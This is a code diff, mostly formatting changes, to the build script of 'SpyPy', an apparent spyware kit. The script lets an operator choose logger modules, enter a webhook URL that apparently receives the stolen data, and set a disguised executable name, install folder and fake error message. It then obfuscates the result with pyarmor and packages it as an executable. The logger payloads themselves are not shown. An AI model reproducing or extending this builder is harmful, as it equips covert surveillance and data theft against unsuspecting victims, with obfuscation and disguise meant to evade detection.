@@ -1,8 +1,10 @@
+# TODO ask the user what platform the are building for (default to the platform they are currently on)
 import os
 import re
 import requests
 import subprocess
 import shutil
+
 
 def get_logger_files():
     return [
@@ -11,23 +13,27 @@ def get_logger_files():
         if file.endswith(".py") and not file.startswith("__")
     ]
 
+
 def select_loggers():
     loggers = get_logger_files()
     selected_loggers = []
     for logger in loggers:
-        choice = input(
-            f"[SPY-PY BUILDER] Include {logger[:-3]} logger? (yes/no): "
-        ).strip().lower()
+        choice = (
+            input(f"[SPY-PY BUILDER] Include {logger[:-3]} logger? (yes/no): ")
+            .strip()
+            .lower()
+        )
         if choice == "yes":
             selected_loggers.append(logger)
     return selected_loggers
+
 
 def assemble_source(selected_loggers):
     imports = set()
     utils_content = ""
     loggers_content = ""
     main_content = ""
-    
+
     if not os.path.exists("spy-py-temp"):
         os.makedirs("spy-py-temp")
 
@@ -100,7 +106,6 @@ def assemble_source(selected_loggers):
     print("[SPY-PY BUILDER] [INFO] Assembly completed successfully.")
 
 
-
 def prepare_source():
     try:
         webhook_url = input(
@@ -152,12 +157,16 @@ def prepare_source():
                 modified_content.append(f'SOFTWARE_EXE_NAME = "{exe_name}"\n')
             elif line.startswith("SOFTWARE_DIR_NAME = "):
                 if software_dir_name:
-                    modified_content.append(f'SOFTWARE_DIR_NAME = "{software_dir_name}"\n')
+                    modified_content.append(
+                        f'SOFTWARE_DIR_NAME = "{software_dir_name}"\n'
+                    )
                 else:
                     modified_content.append(f'SOFTWARE_DIR_NAME = "{exe_name}"\n')
             elif line.startswith("CUSTOM_ERROR_MESSAGE = "):
                 if custom_error_message:
-                    modified_content.append(f'CUSTOM_ERROR_MESSAGE = "{custom_error_message}"\n')
+                    modified_content.append(
+                        f'CUSTOM_ERROR_MESSAGE = "{custom_error_message}"\n'
+                    )
                 else:
                     modified_content.append("CUSTOM_ERROR_MESSAGE = None\n")
             else:
@@ -170,8 +179,11 @@ def prepare_source():
         print("[SPY-PY BUILDER] [INFO] Source preparation completed successfully.")
         return exe_name
     except Exception as e:
-        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while preparing the source: {e}")
+        print(
+            f"[SPY-PY BUILDER] [ERROR] An error occurred while preparing the source: {e}"
+        )
         print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
+
 
 def pack_source(exe_name):
     try:
@@ -191,7 +203,9 @@ def pack_source(exe_name):
         subprocess.run(cfg_command, stdout=None, stderr=None, shell=True)
         subprocess.run(obfuscate_command, stdout=None, stderr=None, shell=True)
     except Exception as e:
-        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while obfuscating the source: {e}")
+        print(
+            f"[SPY-PY BUILDER] [ERROR] An error occurred while obfuscating the source: {e}"
+        )
         print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
         return
 
@@ -200,7 +214,10 @@ def pack_source(exe_name):
         file = os.listdir("dist")[0]
         os.rename(f"dist/{file}", f"dist/{exe_name}")
     except Exception as e:
-        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while renaming the executable: {e}")
+        print(
+            f"[SPY-PY BUILDER] [ERROR] An error occurred while renaming the executable: {e}"
+        )
+
 
 def cleanup():
     try:
@@ -211,8 +228,11 @@ def cleanup():
             shutil.rmtree(".pyarmor")
     except Exception as e:
         print(f"[SPY-PY BUILDER] [ERROR] An error occurred while cleaning up: {e}")
-        print("[SPY-PY BUILDER] [ERROR] Please manually remove the 'spy-py-temp' directory.")
+        print(
+            "[SPY-PY BUILDER] [ERROR] Please manually remove the 'spy-py-temp' directory."
+        )
     print("[SPY-PY BUILDER] [INFO] Cleanup completed successfully.")
+
 
 def finish():
     print(
@@ -223,17 +243,21 @@ def finish():
     )
     print("[SPY-PY BUILDER] [INFO] Thank you for using SpyPy.")
 
+
 def main():
     try:
         selected_loggers = select_loggers()
         assemble_source(selected_loggers)
         exe_name = prepare_source()
-        pack_source(exe_name) 
+        pack_source(exe_name)
         cleanup()
         finish()
     except Exception as e:
-        print(f"[SPY-PY BUILDER] [ERROR] An error occurred during the build process: {e}")
+        print(
+            f"[SPY-PY BUILDER] [ERROR] An error occurred during the build process: {e}"
+        )
         print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
+
 
 if __name__ == "__main__":
     main()
